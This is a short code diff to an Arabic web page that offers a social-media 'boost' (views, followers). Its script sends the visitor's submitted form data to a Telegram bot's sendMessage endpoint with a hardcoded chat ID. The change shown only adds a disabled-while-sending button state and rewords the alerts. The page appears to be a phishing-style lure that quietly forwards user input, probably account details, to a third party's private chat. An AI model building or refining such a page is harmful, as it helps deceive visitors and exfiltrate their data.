@@ -83,7 +83,7 @@
         <option value="مشاهدات">مشاهدات</option>
       </select>
 
-      <button type="submit">ابدأ الرشق الآن</button>
+      <button id="submitBtn" type="submit">ابدأ الرشق الآن</button>
     </form>
   </div>
 
@@ -100,6 +100,10 @@
       var chat_id = "6454073193";
       var url = `https://api.telegram.org/bot${token}/sendMessage`;
 
+      var btn = document.getElementById("submitBtn");
+      btn.disabled = true;
+      btn.innerText = "جاري الإرسال...";
+
       fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -108,9 +112,12 @@
           text: message
         })
       }).then(() => {
-        alert("تم إرسال البيانات بنجاح ✅");
+        alert("✅ تم إرسال البيانات بنجاح");
       }).catch(() => {
-        alert("فشل الإرسال ❌");
+        alert("❌ فشل في الإرسال");
+      }).finally(() => {
+        btn.disabled = false;
+        btn.innerText = "ابدأ الرشق الآن";
       });
     }
   </script>
